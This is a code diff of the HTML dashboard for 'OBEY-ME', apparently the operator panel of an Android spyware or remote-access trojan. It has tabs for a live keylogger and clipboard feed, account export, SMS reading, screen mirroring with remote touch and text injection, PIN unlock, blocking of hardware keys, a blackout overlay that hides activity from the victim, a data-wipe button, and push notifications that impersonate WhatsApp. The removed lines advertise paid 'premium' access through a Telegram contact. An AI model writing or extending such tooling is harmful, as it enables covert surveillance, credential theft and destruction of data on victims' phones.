@@ -2,66 +2,25 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control — Device</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>OBEY-ME — Device Control</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
-    <noscript><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"></noscript>
-    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css?v=2.1">
-    <style>
-    /* Critical Navbar & Profile Image Constraints */
-    .navbar-container { max-width: 1400px; margin: 0 auto; width: 100%; padding: 0 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px; }
-    .user-profile-badge { display: flex; align-items: center; gap: 10px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.1); padding: 6px 14px; border-radius: 30px; }
-    #userAvatar { width: 34px !important; height: 34px !important; border-radius: 50% !important; object-fit: cover !important; border: 2px solid #06b6d4; }
-    </style>
-</head>
-<body>
-
-    <!-- Instant Auth Loading Screen -->
-    <div id="authLoader" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #07070d; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
-        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #7c3aed, #06b6d4); border-radius: 18px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(124,58,237,0.5);">
-            <i class="fas fa-mobile-alt" style="font-size: 2rem; color: #fff;"></i>
-        </div>
-        <div style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 1px;">OBEY-ME</div>
-        <div style="font-size: 0.85rem; color: var(--text-muted); display: flex; align-items: center; gap: 8px;">
-            <i class="fas fa-spinner fa-spin" style="color: var(--accent);"></i> Authenticating account...
-        </div>
-    </div>
-
-    <!-- Premium Feature Lock Modal -->
-    <div id="premiumLockModal" onclick="if(event.target===this)closeLockModal()" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(7, 7, 13, 0.85); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); z-index: 100000; align-items: center; justify-content: center; padding: 20px;">
-        <div style="background: rgba(18, 18, 30, 0.95); border: 1px solid rgba(255, 71, 87, 0.4); border-radius: 20px; max-width: 440px; width: 100%; padding: 32px 24px; text-align: center; box-shadow: 0 0 50px rgba(255, 71, 87, 0.25);">
-            <div style="width: 70px; height: 70px; background: rgba(255, 71, 87, 0.15); border: 1px solid rgba(255, 71, 87, 0.4); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 0 20px rgba(255, 71, 87, 0.3);">
-                <i class="fas fa-lock" style="font-size: 2.2rem; color: #ff4757;"></i>
-            </div>
-            <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.35rem; font-weight: 800; color: #fff; margin-bottom: 10px;">PREMIUM FEATURE LOCKED 🔒</h3>
-            <p style="font-size: 0.9rem; color: #ccc; margin-bottom: 6px; line-height: 1.5;">SMS Reader & Push Notification features are restricted for free accounts.</p>
-            <p style="font-size: 0.95rem; color: #ff4757; font-weight: 700; margin-bottom: 24px;">Access nite hoile connect koro!</p>
-            
-            <a href="https://t.me/abid64x" target="_blank" style="display: inline-flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px 20px; background: linear-gradient(135deg, #0088cc, #00b4d8); color: #fff; text-decoration: none; border-radius: 12px; font-weight: 700; font-size: 0.95rem; box-shadow: 0 0 25px rgba(0, 136, 204, 0.4); transition: all 0.2s ease;">
-                <i class="fab fa-telegram-plane" style="font-size: 1.2rem;"></i> Connect on Telegram (@abid64x)
-            </a>
-            
-            <button onclick="closeLockModal()" style="margin-top: 16px; background: transparent; border: none; color: var(--text-muted); font-size: 0.85rem; cursor: pointer; padding: 6px 12px;">Close</button>
-        </div>
-    </div>
+    <link rel="stylesheet" href="style.css?v=3.1">
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <script>
-        const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];
         const urlParams = new URLSearchParams(window.location.search);
         const UID = urlParams.get('uid') || 'master01';
         const DID = urlParams.get('did') || '';
         const FIREBASE_URL = urlParams.get('firebase_url') || "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/";
         
-        // Extract project ID from database URL for proper initialization
         const projectId = FIREBASE_URL.replace('https://', '').split('.')[0].split('-default-rtdb')[0];
         if (!firebase.apps.length) {
             firebase.initializeApp({
@@ -82,29 +41,21 @@
             });
         }
     </script>
-    <style>
-    .node-box {
-        position: absolute;
-        border: 1px solid rgba(0,255,150,0.3);
-        background: rgba(0,0,0,0.4);
-        color: #fff;
-        font-size: 10px;
-        overflow: hidden;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        user-select: none;
-        pointer-events: none;
-    }
-    .node-box.clickable {
-        border: 1px solid rgba(255,200,0,0.6);
-        background: rgba(255,200,0,0.1);
-    }
-    </style>
 </head>
 <body>
-    <!-- Navbar -->
+
+    <!-- Instant Auth Loading Screen -->
+    <div id="authLoader" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #050507; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
+        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #ff453a 0%, #b91c1c 100%); border-radius: 18px; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 30px var(--primary-glow); border: 1px solid rgba(255,255,255,0.2);">
+            <i class="fas fa-mobile-alt" style="font-size: 1.8rem; color: #fff;"></i>
+        </div>
+        <div style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 0.5px;">DEVICE CONTROL</div>
+        <div style="font-size: 0.85rem; color: var(--text-secondary); display: flex; align-items: center; gap: 8px;">
+            <i class="fas fa-spinner fa-spin" style="color: var(--primary);"></i> Initializing Device Stream...
+        </div>
+    </div>
+
+    <!-- Floating Liquid Glass Navbar -->
     <nav class="navbar">
         <div class="navbar-container">
             <div class="navbar-top-row">
@@ -113,200 +64,270 @@
                     OBEY-ME
                 </a>
                 
-                <div id="userBadge" style="display: none;" class="user-profile-badge">
-                    <img id="userAvatar" src="" alt="Avatar" class="user-avatar-img" style="display: none;">
-                    <i id="userAvatarFallback" class="fas fa-user-circle" style="font-size: 1.1rem; color: var(--accent);"></i>
-                    <div class="user-info-col">
-                        <span id="userEmailNav" class="user-name-txt"></span>
-                        <span id="userRoleBadge" class="role-badge-txt"></span>
-                    </div>
-                    <button id="signOutBtn" onclick="firebase.auth().signOut().then(() => window.location.href = 'index.html')" class="btn-signout">
-                        <i class="fas fa-sign-out-alt"></i><span class="hide-mobile"> Sign Out</span>
-                    </button>
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <a href="index.html" class="btn-ghost" style="padding: 6px 14px; font-size: 0.8rem; border-radius: var(--radius-pill);">
+                        <i class="fas fa-arrow-left me-1"></i> Dashboard
+                    </a>
                 </div>
             </div>
 
             <div class="navbar-bottom-row">
-                <a href="admin.html" id="adminPanelBtn" class="nav-link admin-link" style="display: none;"><i class="fas fa-user-shield me-1"></i> Admin Panel</a>
-                <a href="index.html" class="nav-link"><i class="fas fa-hammer me-1"></i> Builder</a>
-                <span class="live-badge"><span class="live-dot"></span> SYSTEM ACTIVE</span>
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <span style="font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">DEVICE ID:</span>
+                    <code id="devId" style="color: var(--primary); font-weight: 700; font-size: 0.8rem;">Loading...</code>
+                </div>
+                <span class="live-badge"><span class="live-dot"></span> LIVE LINK</span>
             </div>
         </div>
     </nav>
 
-    <!-- Main Content -->
-    <main style="max-width: 1400px; margin: 0 auto; padding: 32px 24px;">
+    <!-- Main Content Grid -->
+    <main style="max-width: 1400px; margin: 0 auto; padding: 24px 20px;">
         <div class="fade-in">
-            <!-- Device Header -->
-            <div class="device-header">
-                <div class="device-avatar"><i class="fas fa-mobile-alt"></i></div>
-                <div style="flex:1;">
-                    <h3 id="deviceModel" style="font-size:1.1rem;margin-bottom:2px;">Loading...</h3>
-                    <div class="device-meta">
-                        <span class="device-meta-item"><i class="fas fa-fingerprint"></i> <span id="devId">Loading...</span></span>
-                        <span class="device-meta-item"><i class="fas fa-battery-half"></i> <span id="devBattery">--%</span></span>
-                        <span class="device-meta-item" id="devStatus"><i class="fas fa-circle"></i> Checking...</span>
-                    </div>
-                </div>
-                <a href="index.html" class="btn-ghost"><i class="fas fa-arrow-left" style="margin-right:6px;"></i>Back</a>
-            </div>
-
-            <!-- Feature Tabs -->
-            <div class="tab-nav" style="margin-bottom:24px;">
-                <button class="tab-btn active" onclick="switchTab('keylogger')"><i class="fas fa-keyboard"></i> Keylogger & Clipboard</button>
-                <button class="tab-btn" onclick="switchTab('accounts')"><i class="fas fa-user-circle"></i> Accounts</button>
-                <button class="tab-btn" onclick="switchTab('apps')"><i class="fas fa-th-list"></i> Installed Apps</button>
-                <button class="tab-btn" onclick="switchTab('sms')"><i class="fas fa-sms"></i> SMS Messages</button>
-                <button class="tab-btn" onclick="switchTab('remote')"><i class="fas fa-mobile-alt"></i> Remote Control</button>
-                <button class="tab-btn" onclick="switchTab('notification')"><i class="fas fa-bell"></i> Send Notification</button>
-            </div>
-
-            <!-- TAB: Keylogger -->
-            <div id="tab-keylogger" class="tab-content active">
-                <div class="card">
-                    <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
-                        <h4 style="font-size:0.95rem;"><i class="fas fa-keyboard text-warning-c" style="margin-right:8px;"></i>Live Feed</h4>
-                        <span class="live-badge"><span class="live-dot"></span>LIVE</span>
-                    </div>
-                    <div style="padding:20px;max-height:600px;overflow-y:auto;" id="keylogList">
-                        <div class="empty-state"><i class="fas fa-keyboard"></i><p>Waiting for keystrokes or clipboard...</p></div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- TAB: Accounts -->
-            <div id="tab-accounts" class="tab-content">
-                <div class="card">
-                    <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
-                        <h4 style="font-size:0.95rem;"><i class="fas fa-user-circle text-primary-c" style="margin-right:8px;"></i>Device Accounts</h4>
-                        <button class="btn-ghost" onclick="sendCommand('exportAccounts')" style="padding:5px 12px;font-size:0.72rem;"><i class="fas fa-sync-alt" style="margin-right:4px;"></i>Request Accounts</button>
-                    </div>
-                    <div style="padding:20px;" id="accountsList">
-                        <div class="empty-state"><i class="fas fa-user-slash"></i><p>Click 'Request Accounts' to fetch.</p></div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- TAB: Apps -->
-            <div id="tab-apps" class="tab-content">
-                <div class="card">
-                    <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
-                        <h4 style="font-size:0.95rem;"><i class="fas fa-th-list text-accent" style="margin-right:8px;"></i>Installed Apps</h4>
-                        <button class="btn-ghost" onclick="sendCommand('getApps')" style="padding:5px 12px;font-size:0.72rem;"><i class="fas fa-sync-alt" style="margin-right:4px;"></i>Fetch Apps</button>
-                    </div>
-                    <div style="padding:20px;" id="appsList">
-                        <div class="empty-state"><i class="fas fa-box-open"></i><p>Click 'Fetch Apps' to load.</p></div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- TAB: SMS -->
-            <div id="tab-sms" class="tab-content">
-                <div class="card">
-                    <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
-                        <h4 style="font-size:0.95rem;"><i class="fas fa-sms text-success-c" style="margin-right:8px;"></i>SMS Messages</h4>
-                        <button class="btn-ghost" onclick="sendCommand('getSMS')" style="padding:5px 12px;font-size:0.72rem;"><i class="fas fa-sync-alt" style="margin-right:4px;"></i>Fetch Inbox</button>
-                    </div>
-                    <div style="padding:20px;max-height:600px;overflow-y:auto;" id="smsListContainer">
-                        <div class="empty-state"><i class="fas fa-envelope"></i><p>Click 'Fetch Inbox' or wait for a new message...</p></div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- TAB: Remote Control -->
-            <div id="tab-remote" class="tab-content">
-                <div style="display:flex; flex-direction:column; align-items:center; padding: 20px 0;">
-                    <div style="width: 320px; border: 2px solid #00b894; border-radius: 6px; background: #0f0f0f; overflow: hidden; font-family: sans-serif; box-shadow: 0 8px 24px rgba(0,0,0,0.5);">
-                        
-                        <!-- Top Bar -->
-                        <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; background: #161616; border-bottom: 1px solid #222;">
-                            <div style="display: flex; align-items: center; gap: 8px;">
-                                <div id="statusIndicator" style="width: 12px; height: 12px; background: #ff4757; border-radius: 2px;"></div>
-                                <span style="color: #999; font-size: 0.75rem; font-weight: 600;">Screen reader | -- | FPS: <span id="fpsCount" style="color:#00b894;">0</span></span>
-                            </div>
-                            <button id="mainStartBtn" onclick="toggleRemoteState()" style="background: #252525; border: 1px solid #333; color: white; width: 28px; height: 28px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s;">
-                                <i class="fas fa-play" id="mainStartIcon" style="font-size: 0.8rem; margin-left: 2px;"></i>
-                            </button>
+            
+            <!-- Device Overview Header Card (Apple Liquid Glass) -->
+            <div class="card" style="margin-bottom: 20px; padding: 20px 24px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px;">
+                    <div style="display: flex; align-items: center; gap: 16px;">
+                        <div style="width: 52px; height: 52px; border-radius: 16px; background: rgba(255, 59, 48, 0.12); border: 1px solid rgba(255, 59, 48, 0.25); display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 20px var(--primary-glow);">
+                            <i class="fas fa-mobile-alt" style="font-size: 1.6rem; color: var(--primary);"></i>
                         </div>
-                        
-                        <!-- Toolbar -->
-                        <div style="display: flex; gap: 18px; padding: 12px 15px; background: #111;">
-                            <i class="fas fa-bell" style="color: #777; cursor: pointer; font-size: 1.1rem; transition: color 0.2s;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'" onclick="sendGlobal('notifications')"></i>
-                            <i class="fas fa-sliders-h" style="color: #777; cursor: pointer; font-size: 1.1rem; transition: color 0.2s;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'" onclick="sendGlobal('quickSettings')"></i>
-                            <i class="fas fa-lock" style="color: #777; cursor: pointer; font-size: 1.1rem; transition: color 0.2s;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'" onclick="sendGlobal('lockScreen')"></i>
-                            <i class="fas fa-unlock" style="color: #777; cursor: pointer; font-size: 1.1rem; transition: color 0.2s;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'" onclick="promptUnlock()"></i>
-                            <i class="fas fa-sync-alt" style="color: #777; cursor: pointer; font-size: 1.1rem; transition: color 0.2s;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'" onclick="forceRefresh()"></i>
-                        </div>
-                        
-                        <!-- Screen Canvas -->
-                        <div id="screenCanvas" style="width: 320px; height: 600px; background: #0c0c0c; position: relative; overflow: hidden; cursor: crosshair; display: flex; align-items: center; justify-content: center; touch-action: none;" onpointerdown="handlePointerDown(event)" onpointerup="handlePointerUp(event)" oncontextmenu="event.preventDefault()">
-                            <div class="empty-state" id="screenWait" style="text-align: center; color: #444; pointer-events: none;">
-                                <p style="font-size: 0.85rem; font-weight: bold; margin: 0;">Click START to begin<br>screen rendering</p>
+                        <div>
+                            <h2 id="deviceModel" style="font-size: 1.35rem; font-weight: 800; color: #fff; margin-bottom: 4px; font-family: 'Outfit', sans-serif;">Connecting to Device...</h2>
+                            <div style="display: flex; align-items: center; gap: 14px; font-size: 0.82rem; color: var(--text-secondary);">
+                                <span><i class="fas fa-battery-half" style="color: var(--success); margin-right: 4px;"></i> <span id="devBattery">--%</span></span>
+                                <span id="devStatus" style="font-weight: 600;"><i class="fas fa-circle" style="color: var(--warning); font-size: 8px;"></i> Checking...</span>
                             </div>
                         </div>
-                        
-                        <!-- Bottom Navigation -->
-                        <div style="display: flex; justify-content: space-around; align-items: center; padding: 15px 0; background: #111; border-top: 1px solid #1a1a1a;">
-                            <i class="fas fa-bars" style="color: #666; cursor: pointer; font-size: 1.2rem; transition: color 0.2s;" onmouseover="this.style.color='#aaa'" onmouseout="this.style.color='#666'" onclick="sendGlobal('recents')"></i>
-                            <i class="fas fa-circle" style="color: #666; cursor: pointer; font-size: 1.2rem; transition: color 0.2s;" onmouseover="this.style.color='#aaa'" onmouseout="this.style.color='#666'" onclick="sendGlobal('home')"></i>
-                            <i class="fas fa-caret-left" style="color: #666; cursor: pointer; font-size: 1.6rem; transition: color 0.2s;" onmouseover="this.style.color='#aaa'" onmouseout="this.style.color='#666'" onclick="sendGlobal('back')"></i>
-                        </div>
                     </div>
+
+                    <!-- Quick Global Action Strip -->
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                        <button onclick="sendGlobal('home')" class="btn-ghost" style="padding: 7px 12px; border-radius: var(--radius-pill); font-size: 0.78rem;" title="Home Button">
+                            <i class="fas fa-home"></i> Home
+                        </button>
+                        <button onclick="sendGlobal('back')" class="btn-ghost" style="padding: 7px 12px; border-radius: var(--radius-pill); font-size: 0.78rem;" title="Back Button">
+                            <i class="fas fa-arrow-left"></i> Back
+                        </button>
+                        <button onclick="sendGlobal('recents')" class="btn-ghost" style="padding: 7px 12px; border-radius: var(--radius-pill); font-size: 0.78rem;" title="Recent Apps">
+                            <i class="fas fa-th-large"></i> Apps
+                        </button>
+                        <button onclick="sendGlobal('notifications')" class="btn-ghost" style="padding: 7px 12px; border-radius: var(--radius-pill); font-size: 0.78rem;" title="Notification Shade">
+                            <i class="fas fa-bell"></i> Shade
+                        </button>
+                        <button onclick="sendGlobal('lock')" class="btn-ghost" style="padding: 7px 12px; border-radius: var(--radius-pill); font-size: 0.78rem;" title="Lock Device Screen">
+                            <i class="fas fa-lock"></i> Lock
+                        </button>
+                        <button onclick="promptUnlock()" class="btn-ghost" style="padding: 7px 12px; border-radius: var(--radius-pill); font-size: 0.78rem;" title="Unlock Device with PIN">
+                            <i class="fas fa-key"></i> Unlock
+                        </button>
+                        <button onclick="sendCommand('wake_screen')" class="btn-ghost" style="padding: 7px 12px; border-radius: var(--radius-pill); font-size: 0.78rem;" title="Wake Screen">
+                            <i class="fas fa-sun"></i> Wake
+                        </button>
+                        <button onclick="sendCommand('wipe_data')" class="btn-danger-ghost" style="padding: 7px 12px; border-radius: var(--radius-pill); font-size: 0.78rem;" title="Wipe Target Data">
+                            <i class="fas fa-skull"></i> Wipe
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Segmented Control Tabs (Apple iOS Tab Bar) -->
+            <div class="tabs-container">
+                <button class="tab-btn active" onclick="switchTab('screen')">
+                    <i class="fas fa-desktop"></i> Screen Mirror & Touch
+                </button>
+                <button class="tab-btn" onclick="switchTab('keylogs')">
+                    <i class="fas fa-keyboard"></i> Keylogger & Clipboard
+                </button>
+                <button class="tab-btn" onclick="switchTab('accounts')">
+                    <i class="fas fa-user-circle"></i> Accounts
+                </button>
+                <button class="tab-btn" onclick="switchTab('apps')">
+                    <i class="fas fa-th"></i> Installed Apps
+                </button>
+                <button class="tab-btn" onclick="switchTab('sms')">
+                    <i class="fas fa-envelope"></i> SMS Reader
+                </button>
+                <button class="tab-btn" onclick="switchTab('notification')">
+                    <i class="fas fa-paper-plane"></i> Push Notification
+                </button>
+            </div>
+
+            <!-- TAB 1: Screen Mirror & Remote Touch -->
+            <div id="tab-screen" class="tab-content active">
+                <div style="display: grid; grid-template-columns: minmax(320px, 420px) 1fr; gap: 24px; align-items: start;">
                     
-                    <!-- Controls Area below the phone frame -->
-                    <div style="width: 320px; margin-top: 15px;">
-                        <!-- Send Text -->
-                        <div style="display: flex; background: #1a1a1a; border-radius: 4px; overflow: hidden; margin-bottom: 15px; border: 1px solid #222;">
-                            <input type="text" id="sendTextInput" placeholder="Send text..." style="flex: 1; background: transparent; border: none; padding: 12px; color: #ccc; outline: none; font-size: 0.85rem;">
-                            <button onclick="sendInputText()" style="background: #111; color: #00b894; border: none; border-left: 1px solid #222; padding: 0 15px; font-weight: bold; font-size: 0.75rem; cursor: pointer; transition: background 0.2s;" onmouseover="this.style.background='#1a1a1a'" onmouseout="this.style.background='#111'">SEND</button>
+                    <!-- Android Screen Glass Device Frame -->
+                    <div class="card" style="padding: 16px; display: flex; flex-direction: column; align-items: center; background: rgba(12, 10, 14, 0.75);">
+                        <div style="width: 100%; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding: 0 4px;">
+                            <span style="font-size: 0.75rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">
+                                <i class="fas fa-video" style="color: var(--primary); margin-right: 4px;"></i> LIVE DISPLAY
+                            </span>
+                            <span style="font-size: 0.72rem; color: var(--text-secondary);"><span id="fpsCount" style="color: var(--success); font-weight: 700;">0</span> FPS</span>
                         </div>
+
+                        <!-- Canvas Container -->
+                        <div id="screenCanvas" onpointerdown="handlePointerDown(event)" onpointerup="handlePointerUp(event)" style="width: 100%; height: 600px; background: #000; border-radius: 24px; border: 2px solid rgba(255,255,255,0.12); position: relative; overflow: hidden; touch-action: none; cursor: crosshair; box-shadow: 0 10px 40px rgba(0,0,0,0.8), inset 0 0 20px rgba(0,0,0,0.9);">
+                            <div class="empty-state" id="screenWait" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; text-align: center;">
+                                <i class="fas fa-play-circle" style="font-size: 2.4rem; color: var(--primary); margin-bottom: 12px; opacity: 0.8;"></i>
+                                <p style="font-size: 0.88rem; font-weight: 600; color: #fff; margin-bottom: 4px;">Stream Idle</p>
+                                <p style="font-size: 0.75rem; color: var(--text-muted); margin: 0;">Click START below to initialize UI canvas rendering</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Remote Control Configuration & Controls -->
+                    <div style="display: flex; flex-direction: column; gap: 18px;">
                         
-                        <!-- Interval & Privacy -->
-                        <div style="display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-weight: bold; color: #888;">
-                            <div style="display: flex; align-items: center; gap: 8px;">
-                                <span>INTERVAL:</span>
-                                <select id="intervalSelect" onchange="updateInterval()" style="background: #ccc; color: #000; border: 1px solid #000; padding: 4px 8px; font-weight: bold; outline: none; cursor: pointer; border-radius: 2px;">
-                                    <option value="500">500ms</option>
-                                    <option value="1000" selected>1000ms</option>
-                                    <option value="2000">2000ms</option>
-                                    <option value="5000">5000ms</option>
-                                </select>
+                        <!-- Streaming Engine Controller -->
+                        <div class="card" style="padding: 22px;">
+                            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px;">
+                                <h4 style="font-size: 1rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
+                                    <i class="fas fa-sliders-h text-primary-c"></i> Stream Engine Control
+                                </h4>
+                                <div style="display: flex; align-items: center; gap: 8px;">
+                                    <span id="statusIndicator" style="width: 10px; height: 10px; border-radius: 50%; background: #ff4757; box-shadow: 0 0 8px currentColor; display: inline-block;"></span>
+                                </div>
                             </div>
-                            <div style="display: flex; align-items: center; gap: 8px;">
-                                <span style="color: #999;">BLOCK BUTTONS:</span>
-                                <input type="checkbox" id="blockBtnsCheckbox" onchange="toggleBlockBtnsCb()" style="cursor: pointer; width: 14px; height: 14px; margin:0; accent-color:#ff4757;">
+
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-bottom: 18px;">
+                                <div>
+                                    <label class="form-label">Refresh Interval</label>
+                                    <select id="intervalSelect" class="form-input" onchange="updateInterval()">
+                                        <option value="500">Ultra-Fast (500ms)</option>
+                                        <option value="1000" selected>Balanced (1000ms)</option>
+                                        <option value="2000">Eco-Battery (2000ms)</option>
+                                    </select>
+                                </div>
+                                <div style="display: flex; flex-direction: column; justify-content: flex-end;">
+                                    <button id="mainStartBtn" onclick="toggleRemoteState()" class="btn-primary-glow" style="width: 100%; border-radius: var(--radius-pill); font-size: 0.85rem; padding: 10px 16px;">
+                                        <i id="mainStartIcon" class="fas fa-play" style="margin-right: 6px;"></i> START STREAM
+                                    </button>
+                                </div>
                             </div>
-                            <div style="display: flex; align-items: center; gap: 8px;" onclick="if(!window.isUserAdmin && (!window.userPermissions || window.userPermissions.privacy_screen!==true)) showLockModal('Privacy Screen feature is restricted for free accounts.')">
-                                <span style="color: #999;">PRIVACY SCREEN: <span id="privacyLockBadge" style="display:none; color:#ff4757; margin-left:2px;"><i class="fas fa-lock"></i></span></span>
-                                <input type="checkbox" id="privacyCheckbox" onchange="togglePrivacyCb()" style="cursor: pointer; width: 14px; height: 14px; margin:0; accent-color:#00b894;">
+
+                            <!-- Stream Modifiers -->
+                            <div style="background: rgba(255,255,255,0.03); padding: 14px 18px; border-radius: 14px; border: 1px solid var(--border); display: flex; flex-direction: column; gap: 12px;">
+                                <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none;">
+                                    <span style="font-size: 0.82rem; color: #fff; font-weight: 600;">
+                                        <i class="fas fa-user-secret" style="color: var(--primary); margin-right: 6px;"></i> Blackout Screen (Privacy Overlay)
+                                        <span id="privacyLockBadge" class="live-badge" style="margin-left: 6px; font-size: 0.62rem; display: none;">VIP</span>
+                                    </span>
+                                    <input type="checkbox" id="privacyCheckbox" onchange="togglePrivacyCb()" style="accent-color: var(--primary); width: 18px; height: 18px;">
+                                </label>
+
+                                <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none;">
+                                    <span style="font-size: 0.82rem; color: #fff; font-weight: 600;">
+                                        <i class="fas fa-ban" style="color: var(--warning); margin-right: 6px;"></i> Block Hardware Keys (Back/Home/Power)
+                                    </span>
+                                    <input type="checkbox" id="blockBtnsCheckbox" onchange="toggleBlockBtnsCb()" style="accent-color: var(--primary); width: 18px; height: 18px;">
+                                </label>
+                            </div>
+
+                            <div style="margin-top: 14px; display: flex; gap: 8px;">
+                                <button onclick="forceRefresh()" class="btn-ghost" style="flex: 1; border-radius: var(--radius-pill); font-size: 0.78rem;">
+                                    <i class="fas fa-sync-alt me-1"></i> Force Canvas Sync
+                                </button>
                             </div>
                         </div>
+
+                        <!-- Direct Text & Keystroke Injector -->
+                        <div class="card" style="padding: 22px;">
+                            <h4 style="font-size: 1rem; font-weight: 700; color: #fff; margin-bottom: 14px; display: flex; align-items: center; gap: 8px;">
+                                <i class="fas fa-font text-primary-c"></i> Direct Text Injector
+                            </h4>
+                            <div style="display: flex; gap: 10px;">
+                                <input type="text" id="sendTextInput" class="form-input" placeholder="Type text to type on device..." onkeydown="if(event.key==='Enter')sendInputText()">
+                                <button onclick="sendInputText()" class="btn-primary-glow" style="border-radius: var(--radius-pill); padding: 0 20px;">
+                                    <i class="fas fa-paper-plane"></i>
+                                </button>
+                            </div>
+                            <span style="font-size: 0.72rem; color: var(--text-muted); margin-top: 6px; display: block;">Injects UTF-8 keystrokes directly into active Android focused input field.</span>
+                        </div>
+
                     </div>
                 </div>
             </div>
 
-            <!-- TAB: Notification -->
-            <div id="tab-notification" class="tab-content">
-                <div class="card">
-                    <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
-                        <h4 style="font-size:0.95rem;"><i class="fas fa-bell text-warning-c" style="margin-right:8px;"></i>Send Custom Push Notification</h4>
+            <!-- TAB 2: Keylogger & Clipboard -->
+            <div id="tab-keylogs" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
+                            <i class="fas fa-keyboard text-primary-c"></i> Keystrokes & Clipboard Stream
+                        </h4>
+                        <span class="live-badge"><span class="live-dot"></span> LIVE RECORDER</span>
                     </div>
-                    <div style="padding:20px;">
-                        <div style="display:flex;flex-direction:column;gap:15px;max-width:500px;margin:0 auto;">
-                            <div>
-                                <label style="display:block;margin-bottom:5px;font-size:0.85rem;color:var(--text-muted);">Target App Package (e.g. com.whatsapp)</label>
-                                <input type="text" id="notifPackage" class="chat-input" placeholder="com.whatsapp" value="com.whatsapp" style="width:100%;padding:10px;border-radius:8px;">
-                            </div>
-                            <div>
-                                <label style="display:block;margin-bottom:5px;font-size:0.85rem;color:var(--text-muted);">Notification Title</label>
-                                <input type="text" id="notifTitle" class="chat-input" placeholder="WhatsApp" value="WhatsApp" style="width:100%;padding:10px;border-radius:8px;">
-                            </div>
-                            <div>
-                                <label style="display:block;margin-bottom:5px;font-size:0.85rem;color:var(--text-muted);">Notification Message</label>
